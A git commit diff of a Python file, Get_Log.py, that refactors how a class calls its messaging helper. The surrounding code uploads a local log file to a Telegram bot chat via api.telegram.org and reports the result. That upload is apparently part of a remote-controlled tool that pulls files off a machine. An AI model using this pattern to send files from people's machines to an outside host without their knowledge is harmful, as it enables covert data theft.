b485132f7c5030660fb321518838e7ec2575b641
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-07 08:28:19 +0300

    Update Get_Log.py

--- Get_Log.py
+++ Get_Log.py
@@ -4,7 +4,7 @@ class Get_Log():
 	def __init__(self, _):
 		self.token = _.token
 		self.chat_id = _.chat_id
-		self.Send_Message = _.Send_Message
+		self._ = _
 		self.Main()
 
 	def Main(self):
@@ -13,6 +13,6 @@ class Get_Log():
 			file = open(filename, "r")
 			requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : file})
 			file.close()
-			self.Send_Message.Send("%E2%9C%94%EF%B8%8F Log File Send Succsed.")
+			self._.Send_Message("%E2%9C%94%EF%B8%8F Log File Send Succsed.")
 		else:
-			self.Send_Message.Send("%E2%9C%96%EF%B8%8F Log File Not Exists")
+			self._.Send_Message("%E2%9C%96%EF%B8%8F Log File Not Exists")
